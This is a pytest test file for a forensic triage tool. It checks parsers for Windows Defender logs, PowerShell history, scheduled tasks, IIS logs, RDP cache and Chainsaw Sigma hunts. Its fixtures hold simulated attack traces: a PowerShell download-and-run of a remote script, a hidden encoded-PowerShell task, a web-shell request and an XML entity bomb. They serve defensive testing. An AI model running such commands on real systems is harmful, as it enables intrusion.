"""v0.4.5 part 3 — extra Windows artefacts, typed EVTX views, Chainsaw."""

from __future__ import annotations

import json
import shutil
import struct
import zlib
from pathlib import Path
from unittest.mock import AsyncMock, patch

import pytest

from defair.normalizers.eztools import get_normalizer
from defair.tools.registry import get_default_registry

TASK_XML = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2024-06-19T20:16:36</Date>
    <Author>CORP\\attacker</Author>
    <URI>\\Microsoft\\Windows\\Updater</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled><UserId>CORP\\bob</UserId></LogonTrigger>
    <TimeTrigger><StartBoundary>2024-06-19T21:00:00Z</StartBoundary></TimeTrigger>
  </Triggers>
  <Principals><Principal id="Author"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings><Hidden>true</Hidden><Enabled>true</Enabled></Settings>
  <Actions Context="Author">
    <Exec><Command>powershell.exe</Command><Arguments>-enc SQBFAFgA</Arguments></Exec>
  </Actions>
</Task>"""


def _run_native(tool_name: str, path: Path, tmp_path: Path) -> list[dict]:
    tool = get_default_registry().get(tool_name)
    rows = []
    for source in tool._inputs(str(path)):
        for row in tool.parse_file(source):
            rows.append({**row, "_source_file": str(source)})
    normalizer = get_normalizer(tool_name)
    return [a for a in (normalizer.normalize_row(r) for r in rows) if a]


class TestMplog:
    LOG = (
        "2024-05-21T03:12:44.123Z DETECTIONEVENT MPSOURCE_REALTIME HackTool:Win32/Mimikatz!pz "
        "file:C:\\Users\\bob\\Downloads\\mimi.exe;\r\n"
        "2024-05-21T03:12:45.000Z ProcessImageName: rundll32.exe, Pid: 4242, TotalTime: 30, Count: 5, "
        "MaxTime: 12, MaxTimeFile: \\Device\\HarddiskVolume3\\Temp\\x.dll, EstimatedImpact: 2%\r\n"
        "2024-05-21T03:12:46.000Z SDN:Issuing SDN query for \\Device\\HarddiskVolume3\\Temp\\x.dll "
        "(\\\\?\\C:\\Temp\\x.dll) (sha1=aa11, sha2=bb22)\r\n"
        "2024-05-21T03:12:47.000 [Exclusion] C:\\Temp -> \\Device\\HarddiskVolume3\\Temp\r\n"
        "noise line\r\n"
    )

    def test_parse_and_normalize(self, tmp_path):
        support = tmp_path / "Support"
        support.mkdir()
        (support / "MPLog-20240521-031200.log").write_bytes(self.LOG.encode("utf-16"))
        arts = _run_native("mplog_native", support, tmp_path)
        assert [a["data"]["event"] for a in arts] == ["detection", "process", "file_hash", "exclusion"]
        detection = arts[0]
        assert detection["data"]["threat"] == "HackTool:Win32/Mimikatz!pz"
        assert detection["severity"] == "high" and detection["category"] == "malware"
        assert detection["timestamp"] == "2024-05-21T03:12:44.123Z"
        assert arts[1]["data"]["process"] == "rundll32.exe" and arts[1]["data"]["pid"] == "4242"
        assert arts[2]["data"]["sha256"] == "bb22"
        # no zone on the line: time kept as text, not assumed UTC
        assert arts[3]["timestamp"] is None and arts[3]["data"]["local_time"] == "2024-05-21T03:12:47.000"


class TestPsReadLine:
    def test_history(self, tmp_path):
        path = tmp_path / "Users" / "bob" / "AppData" / "Roaming" / "Microsoft" / "Windows" / \
            "PowerShell" / "PSReadLine" / "ConsoleHost_history.txt"
        path.parent.mkdir(parents=True)
        path.write_text("whoami\nInvoke-WebRequest http://x/a.ps1 `\n  -OutFile a.ps1\n\n.\\a.ps1\n")
        arts = _run_native("psreadline_native", tmp_path / "Users", tmp_path)
        assert [a["data"]["command"] for a in arts] == [
            "whoami", "Invoke-WebRequest http://x/a.ps1 `\n  -OutFile a.ps1", ".\\a.ps1"]
        assert arts[0]["username"] == "bob" and arts[0]["timestamp"] is None
        assert arts[2]["data"]["line_number"] == 5


class TestTasks:
    def test_task_definition(self, tmp_path):
        tasks = tmp_path / "Windows" / "System32" / "Tasks" / "Microsoft" / "Windows"
        tasks.mkdir(parents=True)
        (tasks / "Updater").write_bytes(TASK_XML.encode("utf-16"))
        (tasks.parent / "$I30").write_bytes(b"INDX")  # Dissect pseudo-file: ignored
        arts = _run_native("tasks_native", tmp_path / "Windows" / "System32" / "Tasks", tmp_path)
        assert len(arts) == 1
        art = arts[0]
        assert art["artifact_type"] == "windows.scheduled_task.definition"
        assert art["data"]["task_path"] == "\\Microsoft\\Windows\\Updater"
        assert art["data"]["actions"][0]["arguments"] == "-enc SQBFAFgA"
        assert [t["type"] for t in art["data"]["triggers"]] == ["LogonTrigger", "TimeTrigger"]
        assert art["data"]["hidden"] == "true" and art["username"] == "S-1-5-18"
        # local time without zone: kept as text, no timestamp invented
        assert art["timestamp"] is None
        assert art["data"]["registration_date_local"] == "2024-06-19T20:16:36"
        assert "powershell.exe -enc" in art["description"]

    def test_xml_bomb_refused(self, tmp_path):
        bomb = tmp_path / "bomb"
        bomb.write_text('<?xml version="1.0"?><!DOCTYPE t [<!ENTITY a "aaaa">]><Task>&a;</Task>')
        tool = get_default_registry().get("tasks_native")
        with pytest.raises(Exception):  # noqa: B017 — defusedxml forbids entities
            list(tool.parse_file(bomb))


class TestIis:
    def test_w3c(self, tmp_path):
        logs = tmp_path / "W3SVC1"
        logs.mkdir()
        (logs / "u_ex240521.log").write_text(
            "#Software: Microsoft Internet Information Services 10.0\n"
            "#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip "
            "cs(User-Agent) sc-status\n"
            "2024-05-21 03:12:44 10.0.0.1 POST /aspnet_client/shell.aspx cmd=whoami 443 - 203.0.113.9 "
            "curl/8.0 200\n"
            "2024-05-21 03:12:45 10.0.0.1 GET /truncated\n")
        arts = _run_native("iis_native", tmp_path, tmp_path)
        assert len(arts) == 1
        art = arts[0]
        assert art["timestamp"] == "2024-05-21T03:12:44Z"
        assert "203.0.113.9 POST /aspnet_client/shell.aspx?cmd=whoami → 200" == art["description"]
        assert art["username"] is None


class TestRdpCache:
    def test_bin_tiles_and_collage(self, tmp_path):
        cache = tmp_path / "Users" / "bob" / "AppData" / "Local" / "Microsoft" / \
            "Terminal Server Client" / "Cache"
        cache.mkdir(parents=True)
        tile = struct.pack("<IIHH", 1, 2, 64, 64) + bytes([10, 20, 30, 0]) * 64 * 64
        (cache / "Cache0000.bin").write_bytes(b"RDP8bmp\x00" + struct.pack("<I", 6) + tile * 3)
        tool = get_default_registry().get("rdpcache_native")
        tool.output_dir = tmp_path / "out"
        rows = list(tool.parse_file(cache / "Cache0000.bin"))
        assert rows[0]["tiles"] == 3 and rows[0]["user"] == "bob"
        collage = Path(rows[0]["collage"]).read_bytes()
        assert collage.startswith(b"\x89PNG")
        width, height = struct.unpack(">II", collage[16:24])
        assert (width, height) == (192, 64)
        first = min(Path(rows[0]["tile_dir"]).glob("*.png")).read_bytes()
        idat = first[first.index(b"IDAT") + 4:]
        pixels = zlib.decompressobj().decompress(idat)
        assert pixels[1:5] == bytes([30, 20, 10, 255])  # BGRA → RGBA
        art = get_normalizer("rdpcache_native").normalize_row({**rows[0], "_source_file": "x"})
        assert art["artifact_type"] == "windows.rdp.bitmap_cache" and "3 tile(s)" in art["description"]


class TestWebCache:
    def test_url_user_split(self):
        from defair.tools.webcache_native import _record

        class Rec:
            def __init__(self):
                self.values = {"Url": "Visited: Leroy Jenkins@file:///I:/stuff/doc.jpg", "EntryId": 7,
                               "AccessedTime": 133678392594357046, "ModifiedTime": 0}

            def get(self, column):
                return self.values.get(column)

        row = _record(Rec(), "history", "History", 2)
        assert row["user"] == "Leroy Jenkins" and row["url"] == "file:///I:/stuff/doc.jpg"
        assert row["AccessedTime"] == "2024-08-11T08:40:59.4357046Z" and row["ModifiedTime"] is None
        art = get_normalizer("webcache_native").normalize_row(row)
        assert art["category"] == "file_folder_opening"  # file:// = Explorer access
        assert art["record_key"] == "2#7"


class TestLocateAndProfiles:
    def test_selectors(self, tmp_path):
        from defair.sources.locate import locate_artifacts

        root = tmp_path / "C"
        for rel in ("Windows/System32/Tasks/T", "ProgramData/Microsoft/Windows Defender/Support/MPLog-1.log",
                    "inetpub/logs/LogFiles/W3SVC1/u_ex1.log"):
            (root / rel).parent.mkdir(parents=True, exist_ok=True)
            (root / rel).write_text("x")
        found = locate_artifacts(tmp_path, root)
        assert found["tasks_dir"][0].endswith("Tasks")
        assert found["mplog_dir"][0].endswith("Support")
        assert found["iis_logs"][0].endswith("LogFiles")

    def test_profiles_reference_registered_tools(self):
        from defair.orchestrator.profile import load_profile

        registry = get_default_registry()
        for name in ("windows-triage", "windows-full", "persistence"):
            for step in load_profile(name).steps:
                if step.tool:
                    assert registry.get(step.tool), step.tool


# ---------------------------------------------------------------------------
# Typed EVTX views
# ---------------------------------------------------------------------------


async def _evtx_case(conn):
    from defair.normalizers.pipeline import bulk_insert, enrich, new_stats
    from defair.services import case_service

    case = await case_service.create_case(conn, "views")
    run = {"id": "run1", "run_number": "RUN-001", "case_id": case.id, "tool_name": "evtxecmd"}
    await conn.execute(
        "INSERT INTO tool_runs (id, run_number, case_id, tool_name, status, created_at) "
        "VALUES ('run1', 'RUN-001', ?, 'evtxecmd', 'completed', '2024-01-01')", (case.id,))
    rows = [
        ("4624", "Security", "2024-05-21T03:00:00Z", {"TargetUserName": "bob", "LogonType": "10",
                                                        "IpAddress": "203.0.113.9"}),
        ("4625", "Security", "2024-05-21T02:59:00Z", {"TargetUserName": "admin", "IpAddress": "203.0.113.9"}),
        ("7045", "System", "2024-05-21T03:05:00Z", {"ServiceName": "PSEXESVC", "ImagePath": "%SystemRoot%\\PSEXESVC.exe"}),
        ("4624", "Microsoft-Windows-Sysmon/Operational", "2024-05-21T03:06:00Z", {}),  # wrong channel
    ]
    stats, seen, arts = new_stats(), set(), []
    for i, (eid, channel, ts, event_data) in enumerate(rows):
        arts.append(enrich({
            "artifact_type": "windows.evtx.x", "category": "account_usage", "source_tool": "evtxecmd",
            "timestamp": ts, "hostname": "WS01", "description": f"EventID {eid}",
            "data": {"event_id": eid, "channel": channel, "event_data": event_data},
            "record_key": f"r{i}", "artifact_number": f"ART-{i + 1:03d}",
        }, run, stats, seen))
    await bulk_insert(conn, arts)
    return case


class TestEvtxViews:
    def test_catalog_loads(self):
        from defair.services.evtx_view_service import list_views

        names = {v["name"] for v in list_views()}
        assert {"logons", "process_creation", "services", "scheduled_tasks", "rdp",
                "powershell", "account_changes", "log_cleared", "defender"} <= names

    @pytest.mark.asyncio
    async def test_logons_view(self, db_conn):
        from defair.services.evtx_view_service import get_view

        case = await _evtx_case(db_conn)
        result = await get_view(db_conn, case.id, "logons")
        assert result["total"] == 2
        assert [r["user"] for r in result["rows"]] == ["admin", "bob"]  # time order
        assert result["rows"][1]["source_ip"] == "203.0.113.9" and result["rows"][1]["logon_type"] == "10"
        only = await get_view(db_conn, case.id, "logons", event_id=4625)
        assert only["total"] == 1

    @pytest.mark.asyncio
    async def test_services_view_and_unknown(self, db_conn):
        from defair.services.evtx_view_service import get_view

        case = await _evtx_case(db_conn)
        services = await get_view(db_conn, case.id, "services")
        assert services["rows"][0]["service"] == "PSEXESVC"
        with pytest.raises(ValueError, match="Unknown EVTX view"):
            await get_view(db_conn, case.id, "nope")

    @pytest.mark.asyncio
    async def test_index_exists(self, db_conn):
        cursor = await db_conn.execute("SELECT name FROM sqlite_master WHERE name = 'idx_artifacts_event_id'")
        assert await cursor.fetchone()


# ---------------------------------------------------------------------------
# Chainsaw
# ---------------------------------------------------------------------------

HIT = {
    "group": "Sigma", "kind": "individual", "name": "Windows Defender Threat Detected",
    "id": "57b649ef-ff42-4fb0-8bf6-62da243a1708", "level": "high", "source": "sigma",
    "timestamp": "2023-03-10T02:11:27.715719+00:00", "tags": ["attack.execution", "attack.t1059"],
    "document": {"kind": "evtx", "path": "/evidence/logs/Defender.evtx", "data": {"Event": {
        "System": {"EventID": 1116, "Channel": "Microsoft-Windows-Windows Defender/Operational",
                   "Computer": "WS01", "EventRecordID": 63},
        "EventData": {"Threat Name": "HackTool:Win32/Mimikatz"}}}},
}


class TestChainsaw:
    def test_command(self):
        cmd = get_default_registry().get("chainsaw").build_command(
            "/evidence/logs", "/out", signatures="/sig/sigma", level="high")
        assert cmd[:5] == ["chainsaw", "hunt", "/evidence/logs", "-s", "/sig/sigma"]
        assert "--json" in cmd and ["--level", "high"] == cmd[-2:]

    def test_normalizer_resolves_provenance(self, tmp_path):
        store = tmp_path / "store"
        store.mkdir()
        (store / "INDEX.json").write_text(json.dumps({"sigma": {"sigmahq_core": {
            "rules/windows/builtin/windefend/win_defender_threat.yml": [HIT["id"]]}}}))
        out = tmp_path / "out"
        out.mkdir()
        (out / "chainsaw.json").write_text(json.dumps([HIT, {"group": "Chainsaw", "name": "x"}]))
        (out / "rules.meta").write_text(json.dumps({"store": str(store), "sources": ["sigmahq_core"]}))
        normalizer = get_normalizer("chainsaw")
        arts = normalizer.normalize_directory(out)
        assert len(arts) == 1 and normalizer.stats["skipped"] == 1
        art = arts[0]
        assert art["artifact_type"] == "detection.sigma.match" and art["source_tool"] == "chainsaw"
        assert art["severity"] == "high" and art["hostname"] == "WS01"
        rule = art["data"]["rule"]
        assert rule["source"] == "sigmahq_core"
        assert rule["file"].endswith("win_defender_threat.yml") and rule["ref"]
        assert art["data"]["mitre_techniques"] == ["T1059"]
        assert art["record_key"].startswith("/evidence/logs/Defender.evtx#63/")

    @pytest.mark.asyncio
    async def test_hunt_creates_findings(self, db_conn, tmp_path):
        from defair.services import case_service, hunting_service

        case = await case_service.create_case(db_conn, "chainsaw")
        store = tmp_path / "store"
        store.mkdir()
        (store / "INDEX.json").write_text("{}")

        async def fake_run(self, input_path, output_dir, case_id, **kwargs):
            from datetime import UTC, datetime

            from defair.models.tool_run import ToolRun, ToolRunStatus
            out = Path(output_dir)
            out.mkdir(parents=True, exist_ok=True)
            (out / "chainsaw.json").write_text(json.dumps([HIT]))
            return ToolRun(run_number=kwargs.get("run_number", "RUN-001"), case_id=case_id,
                           tool_name="chainsaw", status=ToolRunStatus.COMPLETED, exit_code=0,
                           output_path=output_dir, output_files=["chainsaw.json"],
                           started_at=datetime.now(UTC), completed_at=datetime.now(UTC))

        with patch("defair.tools.chainsaw.ChainsawTool.run", fake_run), \
             patch("defair.tools.chainsaw.ChainsawTool.is_available", return_value=True):
            result = await hunting_service.hunt_evtx(
                db_conn, str(tmp_path), case.id, engine="chainsaw", output_base=str(tmp_path / "a"))
        assert result["artifacts_produced"] == 1 and result["findings_created"] == 1
        cursor = await db_conn.execute("SELECT source, severity FROM findings WHERE case_id = ?", (case.id,))
        assert tuple(await cursor.fetchone()) == ("chainsaw-sigma", "high")

    @pytest.mark.skipif(not shutil.which("chainsaw"), reason="chainsaw not installed")
    def test_real_binary_on_generated_rule(self, tmp_path):
        """The real binary accepts the assembled symlink tree and our flags."""
        import subprocess

        rules = tmp_path / "sig" / "00_custom"
        rules.mkdir(parents=True)
        (rules / "r.yml").write_text(
            "title: t\nid: 11111111-1111-1111-1111-111111111111\nlogsource: {product: windows, "
            "service: security}\ndetection: {sel: {EventID: 4624}, condition: sel}\nlevel: low\n")
        mapping = Path("/opt/chainsaw/mappings/sigma-event-logs-all.yml")
        if not mapping.exists():
            pytest.skip("chainsaw mappings not installed at /opt/chainsaw")
        cmd = get_default_registry().get("chainsaw").build_command(
            str(tmp_path), str(tmp_path), signatures=str(tmp_path / "sig"))
        assert subprocess.run(cmd, capture_output=True, timeout=60, check=False).returncode == 0


class TestMcp:
    @pytest.mark.asyncio
    @pytest.mark.parametrize("tool, args, expected", [
        ("hunt_chainsaw", {"input_path": "/e/logs", "case_id": "C", "rule_profile": "broad"},
         ["hunt", "/e/logs", "--case", "C", "--profile", "standard", "--engine", "chainsaw",
          "--rule-profile", "broad", "--min-severity", "medium"]),
        ("get_evtx_view", {"case_id": "C", "name": "logons", "user": "bob"},
         ["evtx", "view", "logons", "--case", "C", "--limit", "200", "--offset", "0", "--json",
          "--user", "bob"]),
    ])
    @patch("defair.mcp_server.server.container_service")
    async def test_proxies(self, mock_cs, tool, args, expected):
        from defair.mcp_server.server import mcp

        mock_cs.exec_in_container = AsyncMock(return_value={"exit_code": 0, "stdout": "{}", "stderr": ""})
        await mcp.call_tool(tool, {"container": "defair-case", **args})
        assert mock_cs.exec_in_container.call_args.args[1] == ["defair", *expected]

    @pytest.mark.asyncio
    async def test_list_evtx_views_runs_on_host(self):
        from defair.mcp_server.server import mcp

        result = await mcp.call_tool("list_evtx_views", {})
        assert "logons" in result.content[0].text
